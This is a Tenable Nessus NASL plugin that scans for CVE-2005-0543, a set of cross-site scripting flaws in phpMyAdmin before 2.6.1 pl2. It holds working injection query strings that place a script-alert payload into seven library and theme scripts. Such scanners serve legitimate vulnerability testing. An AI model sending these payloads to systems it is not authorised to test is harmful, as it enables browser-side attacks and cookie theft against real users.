#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(17220);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2015/10/13 15:19:33 $");

  script_cve_id("CVE-2005-0543");
  script_bugtraq_id(12644);
  script_osvdb_id(14096, 14097, 14098, 14099, 14100);

  script_name(english:"phpMyAdmin < 2.6.1 pl2 Libraries and Themes Multiple XSS");
  script_summary(english:"Detects cross-site scripting vulnerabilities in phpMyAdmin Libraries and Themes");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
cross-site scripting vulnerabilities." );
  script_set_attribute(attribute:"description", value:
"The installed version of phpMyAdmin suffers from multiple cross-site
scripting vulnerabilities due to its failure to sanitize user input in
several PHP scripts used as libraries and themes.  A remote attacker
may use these issues to cause arbitrary code to be executed in a
user's browser, to steal authentication cookies and the like." );
  script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=110929725801154&w=2" );
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-1" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin 2.6.1 pl2 or later and disable PHP's
'register_globals' setting." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/25");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/24");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE, no_xss:TRUE);


# A simple alert.
xss = string("<script>alert('", SCRIPT_NAME, "');</script>");
exss = urlencode(str:xss);

n = 0;
cgi[n] = "/libraries/select_server.lib.php";
qs[n++] = "cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&show_server_left=MyToMy&strServer=[" + exss + "]";
cgi[n] = "/libraries/select_server.lib.php";
qs[n++] = "cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&cfg[BgcolorOne]=777777%22%3E%3CH1%3E[" + exss + "]";
cgi[n] = "/libraries/select_server.lib.php";
qs[n++] = "cfg[Servers][cXIb8O3]=toja&cfg[Servers][sp3x]=toty&strServerChoice=%3CH1%3E" + exss;
cgi[n] = "/libraries/display_tbl_links.lib.php";
qs[n++] = "doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&bgcolor=%22%3E[" + exss + "]";
cgi[n] = "/libraries/display_tbl_links.lib.php";
qs[n++] = "doWriteModifyAt=left&del_url=Smutno&is_display[del_lnk]=Mi&row_no=%22%3E[" + exss + "]";
cgi[n] = "/themes/original/css/theme_left.css.php";
qs[n++] = "num_dbs=0&left_font_family=[" + exss + "]";
cgi[n] = "/themes/original/css/theme_right.css.php";
qs[n++] = "right_font_family=[" + exss + "]";


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  for (i = 0; i < n; i ++)
  {
    if (test_cgi_xss(port: port, cgi: cgi[i], dirs: make_list(dir), qs: qs[i], pass_str: xss)) exit(0);
    # Only test all the exploits if the "Perform thorough tests" setting is enabled.
    if (!thorough_tests) break;
  }
}
